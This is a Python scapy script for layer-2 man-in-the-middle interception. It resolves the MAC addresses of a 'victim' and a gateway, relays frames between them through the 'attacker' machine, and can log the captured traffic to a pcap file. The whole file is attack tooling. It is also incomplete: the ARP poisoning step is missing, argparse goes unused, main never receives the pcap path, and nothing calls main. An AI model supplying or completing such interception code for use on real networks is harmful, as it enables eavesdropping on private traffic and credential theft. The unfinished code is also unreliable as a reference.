#!/usr/bin/env python3
import argparse
import time
import sys
import signal
import os
from scapy.all import conf, get_if_hwaddr, srp, Ether, ARP, sendp, sniff, RawPcapWriter

class L2Redirect:
    def __init__(self, iface, victim_ip, gateway_ip, pcap_path=None):
        conf.iface = iface
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.pcap_path = pcap_path
        self.attacker_mac = get_if_hwaddr(self.iface)
        self.victim_mac = None
        self.gateway_mac = None
        self.packets = []

    def resolve_mac(self, ip, timeout=2):
        arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(arp_req, iface=self.iface, timeout=timeout, verbose=0)
        for _, r in ans:
            return r[Ether].src
        return None

    def setup(self):
        self.victim_mac = self.resolve_mac(self.victim_ip)
        self.gateway_mac = self.resolve_mac(self.gateway_ip)
        if not self.victim_mac or not self.gateway_mac:
            raise RuntimeError("Could not resolve victim or gateway MAC")

    def forward_packet(self, pkt):
        if not pkt.haslayer(Ether):
            return
        eth = pkt[Ether]
        if eth.src.lower() == self.attacker_mac.lower():
            return
        if eth.src.lower() == self.victim_mac.lower():
            try:
                eth.dst = self.gateway_mac
                eth.src = self.attacker_mac
                sendp(eth, iface=self.iface, verbose=0)
                if self.pcap_path:
                    self.packets.append(bytes(eth))
                return
            except Exception as e:
                print(e)
        if eth.src.lower() == self.gateway_mac.lower():
            try:
                eth.dst = self.victim_mac
                eth.src = self.attacker_mac
                sendp(eth, iface=self.iface, verbose=0)
                if self.pcap_path:
                    self.packets.append(bytes(eth))
                return
            except Exception as e:
                print(e)

    def start_sniffing(self):
        bpf = f"(ether src {self.victim_mac}) or (ether src {self.gateway_mac})"
        sniff(iface=self.iface, prn=self.forward_packet, filter=bpf, store=0)

    def stop(self):
        if self.pcap_path and self.packets:
            try:
                pcap_writer = RawPcapWriter(self.pcap_path, append=False, sync=True)
                for raw in self.packets:
                    pcap_writer.write(raw)
            except Exception:
                pass

def signal_handler(sig, frame, redirector):
    redirector.stop()
    sys.exit(0)

def main(iface, victim, gateway):

    if os.geteuid() != 0:
        print("must run as root")
        sys.exit(1)

    r = L2Redirect(iface, victim, gateway)
    try:
        r.setup()
    except Exception as e:
        print(f"setup failed: {e}")
        sys.exit(1)

    signal.signal(signal.SIGINT, lambda s,f: signal_handler(s, f, r))
    r.start_sniffing()

